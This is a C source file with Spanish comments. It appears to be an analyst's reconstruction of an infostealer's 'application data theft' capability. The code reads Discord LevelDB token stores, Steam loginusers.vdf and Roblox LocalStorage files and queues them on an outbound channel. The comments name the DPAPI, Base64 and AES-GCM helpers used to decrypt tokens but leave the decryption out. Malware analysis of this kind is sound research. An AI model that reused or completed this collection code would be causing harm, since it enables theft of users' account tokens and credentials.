/* ============================================================
 * Capacidad 12/15 — Robo de datos de aplicaciones
 * Función C : CollectApplicationArtifacts
 * Dirección : 0x18003bb9c   · Nodo N4   · Confianza: Media-alta
 * ------------------------------------------------------------
 * Recolecta artefactos de aplicaciones concretas (vector +0x30,
 * entradas de 0x70 bytes): Discord (LevelDB / marcador de token en
 * Local Storage), Steam (local.vdf + registro) y Roblox (LocalStorage).
 * La ruta incluye helpers de DPAPI (CryptUnprotectData), Base64
 * (CryptStringToBinaryA) y AES-GCM (BCryptDecrypt) para
 * credenciales/tokens.
 * ============================================================
 */

#include "00_tipos_comunes.h"

typedef enum {
    APP_DISCORD = 1,
    APP_STEAM   = 2,
    APP_ROBLOX  = 3
} AppKind;

/* ------------------------------------------------------------------
 * Helpers observados en la ruta de descifrado de secretos:
 *   CryptUnprotectData    (DPAPI)          -> desproteger tokens
 *   CryptStringToBinaryA  (Base64)         -> decodificar valores
 *   BCryptDecrypt         (AES-GCM)        -> cookies/tokens Chromium
 * El descifrado se documenta como pasos de comportamiento; aquí solo
 * se reproduce la recolección estructural de los artefactos.
 * ------------------------------------------------------------------ */

/* Lee un archivo completo a memoria (CreateFileW/ReadFile). */
static ByteBuffer ReadFileArtifact(const wchar_t *path)
{
    ByteBuffer out = { 0, 0, 0 };

    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return out;

    DWORD hi = 0;
    DWORD lo = GetFileSize(h, &hi);
    size_t size = ((size_t)hi << 32) | lo;

    if (size > 0 && size < 0x4000000u) {
        out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, size);
        if (out.data != NULL) {
            DWORD read = 0;
            ReadFile(h, out.data, (DWORD)size, &read, NULL);
            out.len = read;
            out.cap = read;
        }
    }
    CloseHandle(h);
    return out;
}

static void QueueFileArtifact(Channel *channel, const wchar_t *path, MessageKind kind)
{
    ByteBuffer b = ReadFileArtifact(path);
    if (b.data == NULL)
        return;
    QueueTypedMessage(channel, kind, b);
}

/* Enumera los archivos que cumplen `pattern` dentro de `dir`. */
static void CollectDirectoryFiles(Channel *channel, const wchar_t *dir,
                                  const wchar_t *pattern, MessageKind kind)
{
    wchar_t spec[MAX_PATH];
    _snwprintf_s(spec, _countof(spec), _TRUNCATE, L"%s\\%s", dir, pattern);

    WIN32_FIND_DATAW fd;
    HANDLE f = FindFirstFileW(spec, &fd);
    if (f == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wchar_t full[MAX_PATH];
            _snwprintf_s(full, _countof(full), _TRUNCATE, L"%s\\%s", dir, fd.cFileName);
            QueueFileArtifact(channel, full, kind);
        }
    } while (FindNextFileW(f, &fd));
    FindClose(f);
}

/* Discord: LevelDB de Local Storage + marcador de token. */
static void CollectDiscordLevelDbTokens(const AppTarget *app, Channel *channel)
{
    wchar_t dir[MAX_PATH];
    _snwprintf_s(dir, _countof(dir), _TRUNCATE,
                 L"%s\\Local Storage\\leveldb", app->path);
    CollectDirectoryFiles(channel, dir, L"*.ldb", MSG_APP_OR_REGISTRY);
    CollectDirectoryFiles(channel, dir, L"*.log", MSG_APP_OR_REGISTRY);

    /* Búsqueda del marcador de token y descifrado DPAPI: comportamiento
     * documentado (CryptUnprotectData), no reproducido aquí. */
}

/* Steam: local.vdf + valores de registro (HKCU\Software\Valve\Steam). */
static void CollectSteamVdfAndRegistry(const AppTarget *app, Channel *channel)
{
    wchar_t vdf[MAX_PATH];
    _snwprintf_s(vdf, _countof(vdf), _TRUNCATE,
                 L"%s\\config\\loginusers.vdf", app->path);
    QueueFileArtifact(channel, vdf, MSG_APP_OR_REGISTRY);

    /* Registro: lectura de HKCU\Software\Valve\Steam (solo lectura). */
}

/* Roblox: LocalStorage. */
static void CollectRobloxLocalStorage(const AppTarget *app, Channel *channel)
{
    wchar_t dir[MAX_PATH];
    _snwprintf_s(dir, _countof(dir), _TRUNCATE,
                 L"%s\\LocalStorage", app->path);
    CollectDirectoryFiles(channel, dir, L"*.ldb", MSG_APP_OR_REGISTRY);
    CollectDirectoryFiles(channel, dir, L"*.log", MSG_APP_OR_REGISTRY);
}

/* ------------------------------------------------------------------
 * 0x18003bb9c — despacho por aplicación [condicionado].
 * ------------------------------------------------------------------ */
void CollectApplicationArtifacts(const AppTargetList *apps, Channel *channel)
{
    if (apps == NULL || apps->items == NULL || channel == NULL)
        return;

    for (size_t i = 0; i < apps->count; i++) {
        const AppTarget *app = &apps->items[i];
        switch (app->kind) {
        case APP_DISCORD:
            CollectDiscordLevelDbTokens(app, channel);
            break;
        case APP_STEAM:
            CollectSteamVdfAndRegistry(app, channel);
            break;
        case APP_ROBLOX:
            CollectRobloxLocalStorage(app, channel);
            break;
        default:
            break;
        }
    }
}
